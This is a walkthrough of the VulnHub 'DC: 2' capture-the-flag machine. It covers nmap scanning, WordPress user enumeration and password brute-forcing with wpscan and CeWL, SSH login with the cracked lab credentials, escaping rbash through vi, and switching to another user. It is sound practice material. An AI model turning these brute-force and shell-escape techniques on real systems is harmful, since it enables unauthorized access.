::::::::::::::::::::::::::::::: page
# DC: 2 {#dc-2 .title}

\

## 

## DC: 2

- **[DC: 2]{style="color:#663e0e;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/dc-2,311/>

![](images/819-1.png)

- Now unzip the file .
- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3584e4;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/819-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.248
:::

![](images/819-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.248
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.248
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.248
:::

![](images/819-4.png)

1.  [Web Enumeration]{style="color:#3584e4;"} :

- Entry ip in hosts file :

::: codebox
    nano /etc/hosts
:::

![](images/819-5.png)

- Now call the host in browser : <http://dc-2/>
  <http://dc-2/wp-login.php>

<!-- -->

- Run wp-scan to find the username :

::: codebox
    wpscan --url http://dc-2 --enumerate u
:::

![](images/819-6.png)

- Directory brute-force :

::: codebox
    gobuster dir -u http://dc-2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
:::

![](images/819-7.png)

- Visit index.php file :

![](images/819-8.png)

- Also visit the flag file : <http://dc-2/index.php/flag/>

![](images/819-9.png)

- Run the CeWL command to make a wordlist :

::: codebox
    cewl http://dc-2/ > passwords.txt
:::

- Find username take in file :

::: codebox
    nano users.txt
:::

![](images/819-10.png)

- Password Brute-force :

::: codebox
    wpscan --url http://dc-2/ -U users.txt -P passwords.txt
:::

![](images/819-11.png)

- Found Username and Password :

::: codebox
    jerry : adipiscing
    tom : parturient
:::

- Now login worpress : <http://dc-2/wp-login.php>

![](images/819-12.png)

![](images/819-13.png)

1.  [SSH Access on port 7744]{style="color:#3584e4;"} :

- SSH login with tom user :

::: codebox
    ssh tom@192.168.2.248 -p 7744
:::

::: codebox
    Username : tom
    Password : parturient
:::

![](images/819-14.png)

- Shell Identify :

::: codebox
    echo $SHELL
:::

![](images/819-15.png)

- Read the flag3.txt file :

::: codebox
    less flag3.txt
:::

Find the content :

::: codebox
    Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
:::

![](images/819-16.png) Press q to exit the file .

- Escaping rbash Using Vi :

1.  Start Vi :

::: codebox
    vi
:::

1.  Ensure You Are in Command Mode .
2.  If you see : \-- INSERT \--
3.  Press : Esc
4.  This returns Vi to command mode.
5.  Set Bash as the Shell :
6.  Type the command inside Vi :

::: codebox
    :set shell=/bin/bash 
:::

- Press Enter.
- Purpose : This changes Vi\'s shell setting from the default shell to
  /bin/bash.
- Spawn the Shell :
- Inside Vi, type :

::: codebox
    :shell 
:::

- Press Enter.

<!-- -->

- Add standard binary directories to the PATH variable :

::: codebox
    export PATH=/bin:/usr/bin:$PATH
:::

- Change the SHELL environment variable to Bash :

::: codebox
    export SHELL=/bin/bash
:::

- Verify the shell :

::: codebox
    echo $SHELL
:::

![](images/819-17.png)

- Now switch the jerry user :

::: codebox
    su jerry
:::

::: codebox
    Username : jerry
    Password : adipiscing
:::

![](images/819-18.png)

![](images/819-19.png)

- After switch the jerry user then navigate the directory :

::: codebox
    cd /home/jerry
:::

- 
- Check the file list :

::: codebox
    ls
:::

- Read the file :

::: codebox
    cat flag4.txt
:::

![](images/819-20.png)
:::::::::::::::::::::::::::::::
